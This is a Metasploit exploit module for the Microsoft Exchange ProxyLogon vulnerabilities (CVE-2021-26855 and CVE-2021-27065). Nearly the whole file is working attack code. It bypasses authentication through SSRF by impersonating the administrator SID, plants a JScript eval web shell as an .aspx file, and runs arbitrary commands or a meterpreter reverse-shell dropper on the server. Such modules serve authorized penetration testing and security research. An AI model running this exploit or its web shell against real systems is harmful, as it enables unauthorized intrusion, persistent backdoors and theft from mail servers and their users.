##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon RCE',
        'Description' => %q{
          This module exploit a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication, impersonating as the
          admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to get
          the RCE (Remote Code Execution).

          By taking advantage of this vulnerability, you can execute arbitrary
          commands on the remote Microsoft Exchange Server.

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)
          'Jang (@testanull)', # Vulnerability analysis + PoC (https://twitter.com/testanull)
          'mekhalleh (RAMELLA Sébastien)', # Module author independent researcher (who listen to 'Le Comptoir Sécu' and work at Zeop Entreprise)
          'print("")', # https://www.o2oxy.cn/3169.html
          'lotusdll' # https://twitter.com/lotusdll/status/1371465073525362691
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['CVE', '2021-27065'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'http://aka.ms/exchangevulns'],
          ['URL', 'https://www.praetorian.com/blog/reproducing-proxylogon-exploit'],
          ['URL', 'https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265'],
          ['URL', 'https://www.o2oxy.cn/3169.html'],
          ['URL', 'https://github.com/Zeop-CyberSec/proxylogon_writeup']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'CheckModule' => 'auxiliary/scanner/http/exchange_proxylogon',
          'HttpClientTimeout' => 60,
          'RPORT' => 443,
          'SSL' => true,
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'

        },
        'Platform' => ['windows'],
        'Arch' => [ARCH_CMD, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Windows Dropper',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_X64],
              'Type' => :windows_dropper,
              'CmdStagerFlavor' => %i[psh_invokewebrequest],
              'DefaultOptions' => {
                'DisablePayloadHandler' => false,
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_CMD],
              'Type' => :windows_command,
              'DefaultOptions' => {
                'DisablePayloadHandler' => true,
                'PAYLOAD' => 'cmd/windows/generic'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptString.new('EMAIL', [true, 'A known email address for this organization']),
      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']])
    ])

    register_advanced_options([
      OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\Program Files\\Microsoft\\Exchange Server\\V15']),
      OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\auth']),
      OptBool.new('ForceExploit', [false, 'Override check result', false]),
      OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
      OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
      OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
    ])
  end

  def cmd_windows_generic?
    datastore['PAYLOAD'] == 'cmd/windows/generic'
  end

  def execute_command(cmd, _opts = {})
    web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
    cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd}\").StdOut.ReadAll());"
    send_request_raw(
      'method' => 'POST',
      'uri' => normalize_uri(web_dir, @random_filename),
      'ctype' => 'application/x-www-form-urlencoded',
      'data' => "#{@random_inputname}=#{cmd}"
    )
  end

  def install_payload(exploit_info)
    # exploit_info: [server_name, sid, session, canary, oab_id]

    input_name = rand_text_alpha(4..8).to_s
    shell = "http://o/#<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"#{input_name}\"],\"unsafe\");}</script>"
    data = {
      'identity': {
        '__type': 'Identity:ECP',
        'DisplayName': (exploit_info[4][0]).to_s,
        'RawIdentity': (exploit_info[4][1]).to_s
      },
      'properties': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'ExternalUrl': shell.to_s
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~1942062522",
      data: data,
      cookie: exploit_info[2],
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
        'X-vDirObjectId' => (exploit_info[4][1]).to_s
      }
    )
    return '' if response.code != 200

    input_name
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def patch_sid(sid)
    ar = sid.to_s.split('-')
    if ar[-1] != '500'
      sid = "#{ar[0..6].join('-')}-500"
    end

    sid
  end

  def request_autodiscover(server_name)
    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }

    response = send_http(
      'POST',
      "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522",
      data: soap_autodiscover,
      ctype: 'text/xml; charset=utf-8'
    )

    case response.body
    when /<ErrorCode>500<\/ErrorCode>/
      fail_with(Failure::Unknown, 'No Autodiscover information was found')
    when /<Action>redirectAddr<\/Action>/
      fail_with(Failure::Unknown, 'No email address was found')
    end

    xml = Nokogiri::XML.parse(response.body)

    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
    fail_with(Failure::Unknown, 'No \'LegacyDN\' was found') if legacy_dn.empty?

    server = ''
    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
      type = item.at_xpath('./xmlns:Type', xmlns).content
      if type == 'EXCH'
        server = item.at_xpath('./xmlns:Server', xmlns).content
      end
    end
    fail_with(Failure::Unknown, 'No \'Server ID\' was found') if server.empty?

    [server, legacy_dn]
  end

  # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/c245390b-b115-46f8-bc71-03dce4a34bff
  def request_mapi(server_name, legacy_dn, server_id)
    data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
    headers = {
      'X-Requesttype' => 'Connect',
      'X-Clientinfo' => '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
      'X-Clientapplication' => datastore['MapiClientApp'],
      'X-Requestid' => '{C715155F-2BE8-44E0-BD34-2960067874C8}:2'
    }

    sid = ''
    response = send_http(
      'POST',
      "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522",
      data: data,
      ctype: 'application/mapi-http',
      headers: headers
    )
    if response.code == 200
      sid_regex = /S-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*/

      sid = response.body.match(sid_regex).to_s
    end
    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.empty?

    sid
  end

  def request_oab(server_name, sid, session, canary)
    data = {
      'filter': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'SelectedView': '',
          'SelectedVDirType': 'OAB'
        }
      },
      'sort': {}
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
      data: data,
      cookie: session,
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(sid),
        'msExchTargetMailbox' => patch_sid(sid)
      }
    )

    if response.code == 200
      data = JSON.parse(response.body)
      data['d']['Output'].each do |oab|
        if oab['Server'].downcase == server_name.downcase
          return [oab['Identity']['DisplayName'], oab['Identity']['RawIdentity']]
        end
      end
    end

    []
  end

  def request_proxylogon(server_name, sid)
    data = "<r at=\"Negotiate\" ln=\"#{datastore['EMAIL'].split('@')[0]}\"><s>#{sid}</s></r>"
    session_id = ''
    canary = ''

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/proxyLogon.ecp?a=~1942062522",
      data: data,
      ctype: 'text/xml; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(sid),
        'msExchTargetMailbox' => patch_sid(sid)
      }
    )
    if response.code == 241
      session_id = response.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
      canary = response.get_cookies.scan(/msExchEcpCanary=([\w\-_.]+);*/).flatten[0] # coin coin coin ...
    end

    [session_id, canary]
  end

  # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.
  def run_cve_2021_26855
    # request for internal server name.
    response = send_http(datastore['METHOD'], 'localhost~1942062522')
    if response.code != 500 || response.headers['X-FEServer'].empty?
      print_bad('Could\'t get the \'X-FEServer\' from the headers response.')

      return
    end
    server_name = response.headers['X-FEServer']
    print_status("Internal server name (#{server_name})")

    # get informations by autodiscover request.
    print_status(message('Sending autodiscover request'))
    server_id, legacy_dn = request_autodiscover(server_name)

    print_status("Server: #{server_id}")
    print_status("LegacyDN: #{legacy_dn}")

    # get the user UID using mapi request.
    print_status(message('Sending mapi request'))
    sid = request_mapi(server_name, legacy_dn, server_id)
    print_status("SID: #{sid} (#{datastore['EMAIL']})")

    # search oab
    sid, session, canary, oab_id = search_oab(server_name, sid)

    [server_name, sid, session, canary, oab_id]
  end

  # post-auth arbitrary file write.
  def run_cve_2021_27065(session_info)
    # set external url (and set the payload).
    print_status('Prepare the payload on the remote target')
    input_name = install_payload(session_info)

    fail_with(Failure::Unknown, 'Could\'t prepare the payload on the remote target') if input_name.empty?

    # reset the virtual directory (and write the payload).
    print_status('Write the payload on the remote target')
    remote_file = write_payload(session_info)

    fail_with(Failure::Unknown, 'Could\'t write the payload on the remote target') if remote_file.empty?

    web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')

    # wait a lot.
    i = 0
    while i < datastore['MaxWaitLoop']
      received = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(web_dir, remote_file)
      })
      if received && (received.code == 200)
        break
      end

      print_warning("Wait a lot (#{i})")
      sleep 5
      i += 1
    end

    [input_name, remote_file]
  end

  def search_oab(server_name, sid)
    # request cookies (session and canary)
    print_status(message('Sending ProxyLogon request'))

    print_status('Try to get a good msExchCanary (by patching user SID method)')
    session_id, canary = request_proxylogon(server_name, patch_sid(sid))
    if canary
      session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
      oab_id = request_oab(server_name, sid, session, canary)
    end

    if oab_id.empty?
      print_status('Try to get a good msExchCanary (without correcting the user SID)')
      session_id, canary = request_proxylogon(server_name, sid)
      if canary
        session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
        oab_id = request_oab(server_name, sid, session, canary)
      end
    end

    fail_with(Failure::Unknown, 'No \'ASP.NET_SessionId\' was found') if session_id.nil? || session_id.empty?
    fail_with(Failure::Unknown, 'No \'msExchEcpCanary\' was found') if canary.nil? || canary.empty?
    fail_with(Failure::Unknown, 'No \'OAB Id\' was found') if oab_id.empty?

    print_status("ASP.NET_SessionId: #{session_id}")
    print_status("msExchEcpCanary: #{canary}")
    print_status("OAB id: #{oab_id[1]} (#{oab_id[0]})")

    return [sid, session, canary, oab_id]
  end

  def send_http(method, ssrf, data: '', cookie: '', ctype: '', headers: {})
    ssrf = "X-BEResource=#{ssrf};"
    if cookie
      cookie = "#{ssrf} #{cookie}"
    else
      cookie = "#{ssrf}"
    end

    ctype = 'application/x-www-form-urlencoded' if ctype.empty?

    request = {
      'method' => method,
      'uri' => @random_uri,
      'agent' => datastore['UserAgent'],
      'ctype' => ctype
    }
    request = request.merge({ 'data' => data }) unless data.empty?
    request = request.merge({ 'cookie' => cookie }) unless cookie.empty?
    request = request.merge({'headers' => headers}) unless headers.empty?

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_autodiscover
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
      </Autodiscover>
    SOAP
  end

  def write_payload(exploit_info)
    # exploit_info: [server_name, sid, session, canary, oab_id]
    remote_file = "#{rand_text_alpha(4..8)}.aspx"
    remote_path = "#{datastore['ExchangeBasePath'].split(':')[1]}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}"
    remote_path = "\\\\127.0.0.1\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"

    data = {
      'identity': {
        '__type': 'Identity:ECP',
        'DisplayName': (exploit_info[4][0]).to_s,
        'RawIdentity': (exploit_info[4][1]).to_s
      },
      'properties': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'FilePathName': remote_path.to_s
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~1942062522",
      data: data,
      cookie: exploit_info[2],
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
        'X-vDirObjectId' => (exploit_info[4][1]).to_s
      }
    )
    return '' if response.code != 200

    remote_file
  end

  def exploit
    unless datastore['ForceExploit']
      case check
      when CheckCode::Vulnerable
        print_good('The target appears to be vulnerable')
      when CheckCode::Safe
        fail_with(Failure::NotVulnerable, 'The target does not appear to be vulnerable')
      else
        fail_with(Failure::Unknown, 'The target vulnerability state is unknown')
      end
    end

    @proto = (ssl ? 'https' : 'http')
    @random_uri = normalize_uri('ecp', "#{rand_text_alpha(1..3)}.js")

    print_status(message('Attempt to exploit for CVE-2021-26855'))
    exploit_info = run_cve_2021_26855

    print_status(message('Attempt to exploit for CVE-2021-27065'))
    shell_info = run_cve_2021_27065(exploit_info)

    @random_inputname = shell_info[0]
    @random_filename = shell_info[1]

    print_good("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
    remote_file = "#{datastore['ExchangeBasePath']}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}\\#{@random_filename}"

    # trigger powa!
    case target['Type']
    when :windows_command
      if cmd_windows_generic?
        vprint_status("Generated payload: #{payload.encoded}")

        print_warning('Dumping command output in response')

        cmd = "#{payload.encoded} & del \"#{remote_file}\""
        cmd = cmd.gsub('\\', '\\\\\\').gsub('&', '\u0026')
        cmd = cmd.gsub('"', '\\"')
        response = execute_command(cmd)

        output = response.body.split('Name                            :')[0]
        if output.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line(output)
      end
    when :windows_dropper
      cmd = generate_cmdstager[0].gsub('\\', '\\\\\\').gsub('&', '\u0026')
      execute_command(cmd)

      register_files_for_cleanup(remote_file)
    end

  end

end
